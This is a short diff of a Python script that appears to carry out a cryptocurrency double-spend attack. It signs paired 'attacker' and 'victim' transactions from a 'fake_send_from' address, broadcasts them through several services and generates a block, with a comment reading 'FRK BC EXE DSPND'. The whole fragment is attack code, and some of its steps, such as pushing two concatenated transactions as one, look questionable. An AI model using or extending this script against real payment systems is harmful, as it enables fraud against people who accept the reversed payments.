@@ -120,7 +120,7 @@ tx_attacker = transaction_util.sign(tx_attacker, 0, fake_send_from)
 tx_victim   = transaction_util.sign(tx_victim, 0, fake_send_from)
 tx_victim   = cryptos.serialize(tx_victim)
 tx_attacker = cryptos.serialize(tx_attacker)
-block = f"{tx_attacker}{tx_victim}"
+block = f"{tx_victim}{tx_attacker}"
 
 
 def generate_block(tx):
@@ -188,13 +188,14 @@ time.sleep(1)
 if coin_symbol == "btc":
     broadcast_transaction(tx_victim, testnet)
 else:
-    transaction_util.pushtx(tx_victim)
+    broadcast_mempool_space(tx_victim, testnet)
 # >>>> FRK BC EXE DSPND 0w0
 print()
-broadcast_mempool_space(tx_attacker, testnet)
+transaction_util.pushtx(block)
 input("--- READY... --- ")
 print("generating block")
 generate_block(block)
+#transaction_util.pushtx(tx_attacker)
 print()
 print()
 
